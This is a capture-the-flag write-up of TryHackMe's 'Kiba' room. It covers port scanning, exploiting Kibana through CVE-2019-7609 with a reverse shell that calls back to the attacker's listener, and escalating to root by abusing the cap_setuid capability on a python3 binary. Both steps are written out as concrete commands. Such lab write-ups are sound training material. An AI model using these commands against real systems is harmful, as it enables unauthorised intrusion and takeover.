## Kiba Room From Try Hack Me.

## Difficulty: Easy

## www.tryhackme.com

# Question 1

To find the answer to this question we can simply google it.

When we first paste the IP into google we come across a page with seemingly not alot on it.

![image](https://user-images.githubusercontent.com/66257304/205105281-ded48b5c-170b-4b83-9494-bfd174f9e9af.png)

If we check the page source, we find nothing.

# Rustscan

After finding nothing on the webpage, we should now run a rustscan using the command - `rustscan -a [IP]`

This will return all of the open ports on the machine

![image](https://user-images.githubusercontent.com/66257304/205105864-c9543b6f-dc02-4c1b-8732-581b35c908e5.png)

We see that ports 22, 80, 5044, 5601 are open.
Port 22 being ssh - port 80 being http
But what are the other 2.

If we go to the webpage again but this time enter the port number 5601 instead of port 80?

![image](https://user-images.githubusercontent.com/66257304/205106601-7e5661a1-e4f1-4d6e-9c1d-761255c98333.png)

We come to another webpage, this time with more content.

# Question 2

To find the answer to this question we need to try and locate where the version is, we can do this by looking at all of the tabs on the left and seeing if they lead anywhere

If we go to the management tab, we can see that the version number is displayed there.

# Question 3

To find the answer to this, we can google what the web page is using which is kibana and elasticsearch.

Doing this we come across an exploit which has a CVSS score of 10, which is the highest score.
This exploit will probably be it.

# Question 4

If we google the CVV we found, we come across a exploit script avaliable to us.

We can use this to exploit the system.

Looking at the page, we need to use the script like this.

![image](https://user-images.githubusercontent.com/66257304/205108179-a8a8abff-167b-481a-ba01-b3a89cda20ab.png)

First start a reverse listener using the command `nc -lvnp [PORT]`

So if we download the script, and run it using the command `python2 CVE-2019-7609-kibana-rce.py -u [IP:5601] -host [YOUR IP] -port [NC PORT] --shell`

We see that we now have a reverse shell!

We can go to kibanas home directory and get the user.txt file

# Question  5/6

To answer this question we need to do a bit of googling once again.

# Question 7

Once we find the answer to that once, we can now run the command we found on the target system.

We find that we can see that there was a secret directory in kiba's home directory called hackmeplease containing a file called python3 and if we go and have a look at this file, it is owned by root.

![image](https://user-images.githubusercontent.com/66257304/205110215-37316df6-8378-4e35-b1f5-3c805a929e1c.png)

Having a look, we see `cap_setuid`.

Googling this means we can change our uid to root using the file python3.

To do this we can run the command `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

We now have a root shell and can go to the root directory to find root.txt and complete the room.
